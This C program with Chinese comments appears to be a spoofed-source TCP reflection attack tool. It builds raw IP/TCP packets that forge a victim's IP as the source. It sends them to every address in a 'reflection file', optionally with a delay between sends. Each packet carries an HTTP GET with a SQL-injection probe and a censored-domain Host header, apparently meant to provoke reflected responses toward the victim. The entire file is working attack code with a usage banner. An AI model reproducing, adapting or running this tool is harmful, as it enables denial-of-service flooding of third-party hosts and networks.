#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h>

// 校验和计算函数
unsigned short checksum(unsigned short *b, int len) {
    unsigned short *p = b;
    unsigned int sum = 0;
    unsigned short answer = 0;

    // 计算校验和
    for (sum = 0; len > 1; len -= 2) {
        sum += *p++;
    }
    if (len == 1) {
        sum += *(unsigned char *)p;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

// 创建原始套接字并发送数据包
int create_socket(char *src_ip, int src_port, char *dst_ip) {
    int sockfd;
    struct sockaddr_in dest;
    struct iphdr iph;
    struct tcphdr tcph;
    char packet[4096];

    // 创建套接字
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("套接字创建失败 %s\n", dst_ip);
        return -1; // 失败返回
    }

    // 填充 IP 头部
    memset(&iph, 0, sizeof(iph));
    iph.ihl = 5; // IP 头部长度
    iph.version = 4; // IPv4
    iph.tos = 0; // 服务类型
    iph.tot_len = sizeof(iph) + sizeof(tcph) + strlen("GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n");
    iph.id = htons(12345); // 标识符
    iph.frag_off = 0; // 分段偏移
    iph.ttl = 255; // 生存时间
    iph.protocol = IPPROTO_TCP; // 协议类型
    iph.check = 0; // 校验和（初始为0）
    iph.saddr = inet_addr(src_ip); // 源 IP 地址
    iph.daddr = inet_addr(dst_ip); // 目的 IP 地址

    // 计算 IP 校验和
    iph.check = checksum((unsigned short *)&iph, sizeof(iph));

    // 填充 TCP 头部
    memset(&tcph, 0, sizeof(tcph));
    tcph.source = htons(src_port); // 源端口
    tcph.dest = htons(80); // 目的端口
    tcph.seq = htonl(rand() % (UINT32_MAX - 100000) + 100000); // 随机序列号
    tcph.ack_seq = htonl(5000); // 确认序列号
    tcph.doff = 5; // TCP 头部长度
    tcph.fin = 0; // FIN 标志
    tcph.syn = 0; // SYN 标志（初始化连接时设置）
    tcph.rst = 0; // RST 标志
    tcph.psh = 1; // PSH 标志
    tcph.ack = 1; // ACK 标志（确认号有效）
    tcph.urg = 1; // URG 标志（紧急指针有效）
    tcph.urg_ptr = htons(10); // 紧急指针，假设指向第10个字节
    tcph.window = htons(65535); // 窗口大小
    tcph.check = 0; // 校验和（初始为0）

    // 填充伪头部
    struct pseudo_header {
        u_int32_t source_address; // 源地址
        u_int32_t dest_address; // 目的地址
        u_int8_t placeholder; // 保留字段
        u_int8_t protocol; // 协议
        u_int16_t tcp_length; // TCP 长度
    } psh;

    memset(&psh, 0, sizeof(psh));
    psh.source_address = inet_addr(src_ip);
    psh.dest_address = inet_addr(dst_ip);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(tcph) + strlen("GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));

    // 计算 TCP 校验和
    int psize = sizeof(psh) + sizeof(tcph) + strlen("GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n");
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, (char *)&psh, sizeof(psh));
    memcpy(pseudogram + sizeof(psh), &tcph, sizeof(tcph));
    memcpy(pseudogram + sizeof(psh) + sizeof(tcph), "GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n", strlen("GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));
    
    // 计算校验和并赋值给 TCP 头部
    tcph.check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram); // 释放内存

    // 创建数据包
    memset(packet, 0, 4096);
    memcpy(packet, &iph, sizeof(iph));
    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
    memcpy(packet + sizeof(iph) + sizeof(tcph), "GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n", strlen("GET /index.php?id=1 and 1=1 HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));

    // 设置目标地址
    dest.sin_family = AF_INET;
    dest.sin_port = htons(80);
    dest.sin_addr.s_addr = iph.daddr;

    // 发送数据包
    if (sendto(sockfd, packet, iph.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        printf("发送失败 %s\n",dst_ip);
    } else {
        printf("发送成功 %s\n",dst_ip);
    }

    
    close(sockfd); // 关闭套接字
    return 0; // 成功返回
}

//上面是发送函数 
//create_socket(src_ip[文本型], src_port[整数型], dst_ip[文本型])




int main(int argc, char *argv[]) {
    // 检查参数数量
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <目标ip> <目标port> <反射文件> <延迟毫秒>\n", argv[0]);
        printf("说明:\n");
        printf("  目标IP: 发送数据包的目标地址（使用源IP发送）\n");
        printf("  目标端口: 目标IP的端口号，用于接收数据\n");
        printf("  反射文件: 存储反射数据的文件路径\n");
        printf("  延迟毫秒: 在发送数据包之间的延迟时间（单位：毫秒），-1表示没有延迟。\n");
        return 1; // 返回1表示错误
    }

    // 获取参数
    char *src_ip = argv[1]; // 源IP地址
    int src_port = atoi(argv[2]); // 源端口
    char *target_file = argv[3]; // 目标文件
    int delay = atoi(argv[4]); // 延迟

    // 打开目标文件
    FILE *file = fopen(target_file, "r");
    if (!file) {
        printf("文件打开失败: %s\n", target_file);
        return 1;
    }

    char line[256]; // 用于存储读取的行
    int total_count = 0; // 总行数

    // 先计算总行数
    while (fgets(line, sizeof(line), file)) {
        total_count++;
    }

    // 重置文件指针到开头
    rewind(file);

    int current_count = 0; // 当前行数

    while (fgets(line, sizeof(line), file)) {
        // 去除行末的换行符
        line[strcspn(line, "\r\n")] = 0;
        current_count++;
        
        printf("[%d/%d]", current_count, total_count); //输出当前行数
        
        create_socket(src_ip, src_port, line); //发送函数
        
        // 添加延迟，只有在 delay 不为 -1 时才调用 usleep
        if (delay != -1){
        usleep(delay * 1000);// 将延迟转换为微秒
        }
        
        
    }

    fclose(file); // 关闭文件
    return 0; // 返回0表示成功
}
